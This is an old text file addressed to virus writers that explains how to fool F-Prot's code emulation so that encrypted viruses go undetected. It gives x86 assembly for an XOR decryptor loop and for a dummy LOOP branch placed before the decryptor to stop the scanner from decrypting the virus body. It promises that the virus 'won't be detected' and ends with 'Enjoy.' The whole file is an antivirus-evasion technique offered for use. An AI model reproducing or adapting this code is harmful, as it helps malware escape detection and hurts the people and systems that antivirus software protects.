                     How to fool F-Prot's code decryption
                                     or
                      how to give your encrypted viruses
                             a new lease of life!

First a bit of background.  Any encrypted virus must be decrypted by F-Prot
before it can be detected.  So provided that your virus isn't some fancy
polymorphic algorithmic-detected virus, F-Prot will trace your code for branch
operations, such as LOOP.  And since F-Prot doesn't pay much attention to
register values and flags, branch instructions are executed by F-Prot regardless
of whether they are valid or not.
ie. LOOP will execute even if CX=1, JNZ will execute even if Z flag if set.
When a branch instruction is found, the preceeding code is copied to a buffer,
and that code is executed.  Perhaps an example is in order:

sample_code:    MOV     CX,encrypted_code_size
                MOV     SI,encrypted_code_offset

decrypt_code:   XOR     BYTE PTR DS:[SI],encryption_key
                INC     SI
                LOOP    decrypt_code    ;<-- f-prot finds this command
                                        ;    and presto! decrypted code

To defeat this kind of scanning, simply insert a branch instruction (eg LOOP)
BEFORE the decryptor.  F-Prot will think that it has found the end of the
decryptor, and will execute the branch instead.  The proviso is that your branch
instruction must execute another instruction that is at least 2 bytes long.
This is how F-Prot skips do-nothing loops and branches.
It doesn't matter what other the instruction is though, so your new sample code
could look something like this:

new_sample_code:MOV     CX,0001                 ;to ensure no exec time wasted
                LOOP    new_sample_code         ;f-prot will branch regardless

;f-prot doesn't get to here, so your code stays encrypted

old_sample_code:MOV     CX,encrypted_code_size
                MOV     SI,encrypted_code_offset

decrypt_code:   XOR     BYTE PTR DS:[SI],encryption_key
                INC     SI
                LOOP    decrypt_code

Your virus will work as before, but F-Prot won't detect it.

Enjoy.
